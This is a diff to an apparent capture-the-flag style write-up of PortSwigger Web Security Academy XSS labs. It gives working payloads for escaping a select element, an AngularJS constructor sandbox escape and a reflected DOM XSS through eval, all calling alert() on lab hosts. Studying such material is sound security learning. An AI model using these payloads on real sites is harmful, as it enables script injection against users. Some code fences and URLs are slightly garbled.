@@ -149,6 +149,40 @@ We can try to escape and use this script to exploit it.
 To solve this lab, perform a cross-site scripting attack that <b>breaks out of the select element and calls the alert function</b>.
 
 The steps used to perform can be reached below (sequence).
-1. https://0a3e00fc0496905c80a2765200910078.web-security-academy.net/
-2. https://0a3e00fc0496905c80a2765200910078.web-security-academy.net/product?productId=1
-3. 
+1. https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/
+2. https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1
+3. Since there is no submit button, we can perform attack from URL, let's try to escape the productId value ```<code>"><script>alert(1)</script>```</script></code>https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1%22%3E%3Cscript%3Ealert(1)%3C/script. Then it showed response "Invalid product ID", which means we cannot add something directly to the productId value.
+4. Let's try another way such as add some storeId, because the page has storeId inside of script (<code>document.write</code>). So we can try to escape the storeId <code>&storeId="></code>, then escape select <code>```</select>```</code>, last thing is just add the script such as img as usual. <code>```<img src=a onerror=alert(1)>```</code> (https://0a0d0079037012dd801fdfb600cd0021.web-security-academy.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cimg%20src=a%20onerror=alert(1)%3E).
+
+<br></br>
+
+# 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
+<b>Problem:</b> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
+
+AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
+
+To solve this lab, perform a cross-site scripting attack that <b>executes an AngularJS expression and calls the alert function</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/
+2. https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/post?postId=2
+3. There is comment section, let's try to see the response and learn how this work. After try few payload to escape all the tag on every input form, nothing works. Then I back to the home page and try to attack the search box input (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%3C%2Fh1%3E%3Cimg+src%3Da+onerror%3Dalert%281%29%3E), but the result was same.
+4. Since the basic attacks won't work at all, then as the purpose of this lab was break through AngularJS, we have to learn about it and try use as our weapon. The AngularJS as a framework has ability to execute js by using double braces <code>{{ }}</code> let's try 1+1 <code>{{1+1}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B1%2B1%7D%7D). The page show the result: 2.
+5. Since this happened, we can try to use it <code>{{alert(1)}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7Balert%281%29%7D%7D), but the alert won't show up, this might happened because of restrictions, then let's try to learn attribute on AngularJS, especially on ng-scope.
+6. https://www.techstrikers.com/AngularJS/angularjs-scope-methods.php we can use such as <code>$watch</code> or others. Let's try to use <code>{{$watch.alert(1)}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.alert%28%29%7D%7D), with this we're still not able to execute js, then we have to make constructor that execute the alert function <code>{{$watch.constructor(alert(1))}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.construct%28%27alert%281%29%27%29%7D%7D), it shows "function anonymous(){undefined}".
+7. Let's try to adjust the constructor and script <code>{{ $watch.constructor('alert(1)') }}</code> but the respons showed "function anonymous( ) { alert(1) }", let's adjust it once more <code>{{$watch.constructor('alert(1)')()}}</code> (https://0a0a0008045491b080d26c1e00bf0007.web-security-academy.net/?search=%7B%7B%24watch.constructor%28%27alert%281%29%27%29%28%29%7D%7D).
+
+<br></br>
+
+# 12. Reflected DOM XSS
+#### Lab: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+<b>Problem:</b> This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+To solve this lab, create an injection that <b>calls the alert() function</b>.
+
+The steps used to perform can be reached below (sequence).
+1. https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
+2. https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=a
+3. Based on inspection, we can see the "searchResults.js" with "eval", and also there is JSON response after we sent our input. With this informations. After try few input, the backslash <code>```\```</code> can be escaped from the JSON response, now we can try <code>\</code>
+(https://0ade009103fee64e80d08aa5002100c4.web-security-academy.net/?search=\%22-alert(1)//).
